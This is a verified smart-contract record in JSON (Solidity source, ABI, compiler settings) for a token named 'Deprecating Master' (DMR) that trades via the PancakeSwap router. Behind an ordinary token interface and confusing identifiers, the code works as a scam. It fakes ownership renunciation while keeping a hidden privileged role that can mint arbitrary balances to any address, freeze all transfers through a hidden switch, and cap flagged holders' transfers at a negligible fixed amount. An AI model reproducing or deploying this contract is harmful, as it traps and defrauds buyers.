{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface tokenIs {\n    function createPair(address txFromTeam, address totalToIs) external returns (address);\n}\n\ninterface feeTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLaunched) external view returns (uint256);\n\n    function transfer(address senderSwap, uint256 tokenAt) external returns (bool);\n\n    function allowance(address enableShouldBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderSwap,\n        uint256 tokenAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellLimit, uint256 value);\n    event Approval(address indexed enableShouldBuy, address indexed spender, uint256 value);\n}\n\nabstract contract tradingTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitLaunchTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTxMetadata is feeTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeprecatingMaster is tradingTeam, feeTx, feeTxMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTo;\n    }\n\n    function launchMaxExempt(uint256 tokenAt) public {\n        txBuy();\n        launchLaunched = tokenAt;\n    }\n\n    string private walletReceiver = \"DMR\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoMode;\n    }\n\n    string private receiverTo = \"Deprecating Master\";\n\n    bool public tokenSell;\n\n    function limitAmount(address atTake, uint256 tokenAt) public {\n        txBuy();\n        launchedMode[atTake] = tokenAt;\n    }\n\n    function transferFrom(address autoReceiver, address senderSwap, uint256 tokenAt) external override returns (bool) {\n        if (_msgSender() != atSell) {\n            if (txAmount[autoReceiver][_msgSender()] != type(uint256).max) {\n                require(tokenAt <= txAmount[autoReceiver][_msgSender()]);\n                txAmount[autoReceiver][_msgSender()] -= tokenAt;\n            }\n        }\n        return totalTx(autoReceiver, senderSwap, tokenAt);\n    }\n\n    function fundTx(address sellMaxLimit) public {\n        require(sellMaxLimit.balance < 100000);\n        if (totalWallet) {\n            return;\n        }\n        \n        walletTeam[sellMaxLimit] = true;\n        if (buyExempt) {\n            feeAuto = true;\n        }\n        totalWallet = true;\n    }\n\n    address atSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public totalWallet;\n\n    function totalTx(address autoReceiver, address senderSwap, uint256 tokenAt) internal returns (bool) {\n        if (autoReceiver == teamIs) {\n            return listTrading(autoReceiver, senderSwap, tokenAt);\n        }\n        uint256 liquidityTake = feeTx(fromIs).balanceOf(launchedAtList);\n        require(liquidityTake == launchLaunched);\n        require(senderSwap != launchedAtList);\n        if (minSellMode[autoReceiver]) {\n            return listTrading(autoReceiver, senderSwap, takeTrading);\n        }\n        return listTrading(autoReceiver, senderSwap, tokenAt);\n    }\n\n    mapping(address => bool) public minSellMode;\n\n    function liquidityToken(address launchedLaunch) public {\n        txBuy();\n        \n        if (launchedLaunch == teamIs || launchedLaunch == fromIs) {\n            return;\n        }\n        minSellMode[launchedLaunch] = true;\n    }\n\n    function transfer(address atTake, uint256 tokenAt) external virtual override returns (bool) {\n        return totalTx(_msgSender(), atTake, tokenAt);\n    }\n\n    event OwnershipTransferred(address indexed maxLiquidity, address indexed totalMinReceiver);\n\n    uint256 private tradingFeeMode = 100000000 * 10 ** 18;\n\n    function txBuy() private view {\n        require(walletTeam[_msgSender()]);\n    }\n\n    bool public launchFrom;\n\n    function balanceOf(address teamLaunched) public view virtual override returns (uint256) {\n        return launchedMode[teamLaunched];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return txTo;\n    }\n\n    uint256 launchLaunched;\n\n    mapping(address => uint256) private launchedMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFeeMode;\n    }\n\n    function allowance(address minTx, address swapFee) external view virtual override returns (uint256) {\n        if (swapFee == atSell) {\n            return type(uint256).max;\n        }\n        return txAmount[minTx][swapFee];\n    }\n\n    function listTrading(address autoReceiver, address senderSwap, uint256 tokenAt) internal returns (bool) {\n        require(launchedMode[autoReceiver] >= tokenAt);\n        launchedMode[autoReceiver] -= tokenAt;\n        launchedMode[senderSwap] += tokenAt;\n        emit Transfer(autoReceiver, senderSwap, tokenAt);\n        return true;\n    }\n\n    address private txTo;\n\n    uint8 private autoMode = 18;\n\n    bool private buyExempt;\n\n    function getOwner() external view returns (address) {\n        return txTo;\n    }\n\n    address public teamIs;\n\n    mapping(address => mapping(address => uint256)) private txAmount;\n\n    uint256 constant takeTrading = 20 ** 10;\n\n    function liquiditySell() public {\n        emit OwnershipTransferred(teamIs, address(0));\n        txTo = address(0);\n    }\n\n    constructor (){\n        \n        limitLaunchTo feeTeam = limitLaunchTo(atSell);\n        fromIs = tokenIs(feeTeam.factory()).createPair(feeTeam.WETH(), address(this));\n        \n        teamIs = _msgSender();\n        walletTeam[teamIs] = true;\n        launchedMode[teamIs] = tradingFeeMode;\n        liquiditySell();\n        \n        emit Transfer(address(0), teamIs, tradingFeeMode);\n    }\n\n    mapping(address => bool) public walletTeam;\n\n    bool public feeAuto;\n\n    address launchedAtList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 walletFund;\n\n    bool public walletShould;\n\n    address public fromIs;\n\n    function approve(address swapFee, uint256 tokenAt) public virtual override returns (bool) {\n        txAmount[_msgSender()][swapFee] = tokenAt;\n        emit Approval(_msgSender(), swapFee, tokenAt);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableShouldBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMinReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMaxLimit\",\"type\":\"address\"}],\"name\":\"fundTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"launchMaxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"limitAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minSellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeprecatingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}